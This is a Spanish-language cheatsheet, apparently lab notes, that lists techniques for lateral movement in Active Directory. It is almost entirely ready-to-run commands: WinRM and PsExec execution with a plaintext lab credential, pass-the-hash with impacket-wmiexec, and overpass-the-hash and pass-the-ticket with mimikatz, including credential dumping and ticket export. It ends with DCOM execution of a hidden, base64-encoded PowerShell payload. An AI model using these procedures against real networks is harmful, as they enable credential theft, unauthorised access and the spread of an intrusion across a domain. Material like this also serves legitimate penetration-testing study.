# Cheatsheet: AD-LateralMovement

## Objetivo
Plasmar las técnicas necesarias para ejecutar movimiento lateral en Active Directory
## Herramientas
1. mimikatz
2. PsExec.exe
## Procedimiento y comandos
#### Técnica 1: WIM - WinRM
- Requisitos:
1. Usuario
2. Password
3. IP
4. Payload base64
- Comandos:
> Ejecutar el script Invoke-WinRM.ps1
```powershell
Invoke-WinRM -TargetIP <IP> -Username <usuario> -Password <clave> -PayloadBase64 <payload_base64>
```
#### Técnica 2: PsExec.exe
- Requisitos:
1. user
2. password
3. hostname
- Comando:
1. `.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd`
#### Técnica 3: Pass The Hash
- Requisitos:
1. Autenticacion NTLM
2. hash NTLM
3. conexión SMB a través del firewall - puerto 445.
4. recurso compartido de administración **ADMIN$** esté disponible. 
5. credenciales válidas con permisos administrativos locales.
- Comando:
1. **impacket-wmiexec**
```bash
impacket-wmiexec -hashes :<Local_Administrator_hash> Administrator@<IP_To_move>
```
#### Técnica 4: Overpass the Hash: (convierte un hash NTLM en un ticket kerberos para utilizar kerberos en vez de NTLM como medio de autenticación)
- Requisitos:
1. hash NTLM
- Comandos:
1. `mimikatz # privilege::debug`
2. `sekurlsa::logonpasswords`
3. `mimikatz # sekurlsa::pth /user:user_to_move /domain:corp.com /ntlm:<hash_ntlm_from_user> /run:powershell`
4. `PS C:\Windows\system32> klist`
5. `PS C:\Windows\system32> net use \\hostname_to_move`
6. `PS C:\tools\SysinternalsSuite> .\PsExec.exe \\hostname_to_move cmd`
#### Técnica 5: Pass the ticket
- Requisitos:
1. hash NTLM
2. todos los TGT/TGS

- Comandos:
1. `mimikatz # sekurlsa::tickets /export`
2. `PS C:\Tools> dir *.kirbi`
3. `mimikatz # kerberos::ptt [0;165bb8]-0-0-40810000-dave@cifs-web04.kirbi`
4. `PS C:\Tools> klist`
5. `PS C:\Tools> ls \\web04\backup`

#### Técnica 6: DCOM
- Comandos:
1. 
```powershell
PS C:\Tools> $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<IP_TO_MOVE>"))
```
2. 
```powershell
PS C:\Tools> $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e Base64Payload","7")
```
